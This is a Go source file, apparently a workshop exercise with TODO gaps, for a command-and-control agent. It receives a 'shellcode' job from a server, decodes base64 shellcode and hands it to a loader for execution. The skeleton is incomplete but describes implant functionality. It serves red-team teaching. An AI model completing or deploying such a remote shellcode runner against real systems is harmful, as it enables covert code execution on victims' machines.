package agent

import (
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"log"
	"workshop3_dev/internals/models"
	"workshop3_dev/internals/shellcode"
)

// TODO: Implement orchestrateShellcode to handle the "shellcode" command
// This function receives the job from the server, extracts shellcode args,
// decodes the base64 shellcode, and calls the actual shellcode execution
func (agent *Agent) orchestrateShellcode(job *models.ServerResponse) models.AgentTaskResult {

	// Create an instance of the shellcode args struct
	// TODO: Implement shellcodeArgs of type models.ShellcodeArgsAgent

	// ServerResponse.Arguments contains the command-specific args, so now we unmarshal the field into the struct
	if err := json.Unmarshal(job.Arguments, &shellcodeArgs); err != nil {
		errMsg := fmt.Sprintf("Failed to unmarshal ShellcodeArgs for Task ID %s: %v. ", job.JobID, err)
		log.Printf("|❗ERR SHELLCODE ORCHESTRATOR| %s", errMsg)
		return models.AgentTaskResult{
			JobID:   job.JobID,
			Success: false,
			Error:   errors.New("failed to unmarshal ShellcodeArgs"),
		}
	}
	log.Printf("|✅ SHELLCODE ORCHESTRATOR| Task ID: %s. Executing Shellcode, Export Function: %s, ShellcodeLen(b64)=%d\n",
		job.JobID, shellcodeArgs.ExportName, len(shellcodeArgs.ShellcodeBase64))

	// Some basic agent-side validation
	if shellcodeArgs.ShellcodeBase64 == "" {
		log.Printf("|❗ERR SHELLCODE ORCHESTRATOR| Task ID %s: ShellcodeBase64 is empty.", job.JobID)
		return models.AgentTaskResult{
			JobID:   job.JobID,
			Success: false,
			Error:   errors.New("ShellcodeBase64 cannot be empty"),
		}
	}

	// TODO: Validate that ExportName is not empty

	// Now let's decode our b64
	// TODO create rawShellcode by calling base64.StdEncoding.DecodeString()

	if err != nil {
		log.Printf("|❗ERR SHELLCODE ORCHESTRATOR| Task ID %s: Failed to decode ShellcodeBase64: %v", job.JobID, err)
		return models.AgentTaskResult{
			JobID:   job.JobID,
			Success: false,
			Error:   errors.New("Failed to decode shellcode"),
		}
	}

	// Call the "doer" function
	// TODO create commandShellcode by calling shellcode.New()

	shellcodeResult, err := commandShellcode.DoShellcode(rawShellcode, shellcodeArgs.ExportName)

	finalResult := models.AgentTaskResult{
		JobID: job.JobID,
		// Output will be set below after JSON encoding
	}

	// TODO Marshall shellcodeResult.Message as outputJSON

	// TODO Set finalResult.CommandResult equal to outputJSON

	if err != nil {
		loaderError := fmt.Sprintf("|❗ERR SHELLCODE ORCHESTRATOR| Loader execution error for TaskID %s: %v. Loader Message: %s",
			job.JobID, err, shellcodeResult.Message)
		log.Printf(loaderError)
		finalResult.Error = errors.New(loaderError)
		finalResult.Success = false

	} else {
		log.Printf("|👊 SHELLCODE SUCCESS| Shellcode execution initiated successfully for TaskID %s. Loader Message: %s",
			job.JobID, shellcodeResult.Message)
		finalResult.Success = true
	}

	return finalResult
}
